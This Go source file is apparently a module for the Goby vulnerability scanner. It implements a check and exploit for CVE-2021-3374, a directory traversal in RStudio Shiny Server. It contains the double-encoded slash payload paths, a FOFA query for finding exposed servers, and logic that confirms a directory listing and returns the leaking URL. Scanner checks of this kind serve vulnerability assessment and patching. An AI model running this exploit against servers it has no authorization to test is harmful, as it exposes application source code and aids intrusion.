package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Rstudio Shiny Server Directory traversal (CVE-2021-3374)",
    "Description": "Directory traversal in RStudio Shiny Server before 1.5.16 allows attackers to read the application source code, involving an encoded slash.",
    "Impact": "Rstudio Shiny Server Directory traversal (CVE-2021-3374)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: https://blog.rstudio.com/2021/01/13/shiny-server -1-5-16-update/</p>",
    "Product": "Rstudio-Shiny-Server",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "RStudio Shiny Server 路径遍历漏洞（CVE-2021-3374）",
            "Description": "<p>RStudio Shiny Server是 RStudio 公司的一个应用服务器。将Shiny Web应用程序和交互式文档放在 RStudio 提供的服务器上。</p><p>RStudio Shiny Server before 1.5.16 存在路径遍历漏洞，攻击者可利用该漏洞读取应用程序源代码。</p>",
            "Impact": "<p>RStudio Shiny Server before 1.5.16 存在路径遍历漏洞，攻击者可利用该漏洞读取应用程序源代码。&nbsp;<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<span style=\"color: var(--primaryFont-color);\"><a href=\"https://blog.rstudio.com/2021/01/13/shiny-server-1-5-16-update/\" target=\"_blank\">https://blog.rstudio.com/2021/01/13/shiny-server-1-5-16-update/</a></span></p>",
            "Product": "Rstudio-Shiny-Server",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Rstudio Shiny Server Directory traversal (CVE-2021-3374)",
            "Description": "Directory traversal in RStudio Shiny Server before 1.5.16 allows attackers to read the application source code, involving an encoded slash.",
            "Impact": "Rstudio Shiny Server Directory traversal (CVE-2021-3374)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <span style=\"color: var(--primaryFont-color);\"><a href=\"https://blog.rstudio .com/2021/01/13/shiny-server-1-5-16-update/\" target=\"_blank\">https://blog.rstudio.com/2021/01/13/shiny-server -1-5-16-update/</a></span></p>",
            "Product": "Rstudio-Shiny-Server",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "title=\"shiny server\"",
    "GobyQuery": "title=\"shiny server\"",
    "Author": "ggdp",
    "Homepage": "https://www.rstudio.com",
    "DisclosureDate": "2021-04-02",
    "References": [
        "https://blog.rstudio.com/2021/01/13/shiny-server-1-5-16-update/",
        "https://github.com/colemanjp/shinyserver-directory-traversal-source-code-leak",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-3374",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3374"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2021-3374"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202104-128"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Rstudio-Shiny-Server"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	doGet := func(u *httpclient.FixUrl) (bool, string) {
		if resp, err := httpclient.SimpleGet(u.FixedHostInfo + `/sample-apps/hello/%25%32%66/`); err == nil && strings.Contains(resp.RawBody, "Index of /") {
			return true, "/sample-apps/hello/%2f/"
		} else if resp, err := httpclient.SimpleGet(u.FixedHostInfo + `/%25%32%66/`); err == nil && strings.Contains(resp.RawBody, "Index of /") {
			return true, "/%2f/"
		}
		return false, ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if ok, _ := doGet(hostinfo); ok {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ok, path := doGet(expResult.HostInfo); ok {
				expResult.Output = expResult.HostInfo.FixedHostInfo + path
				expResult.Success = true
			}
			return expResult
		},
	))
}
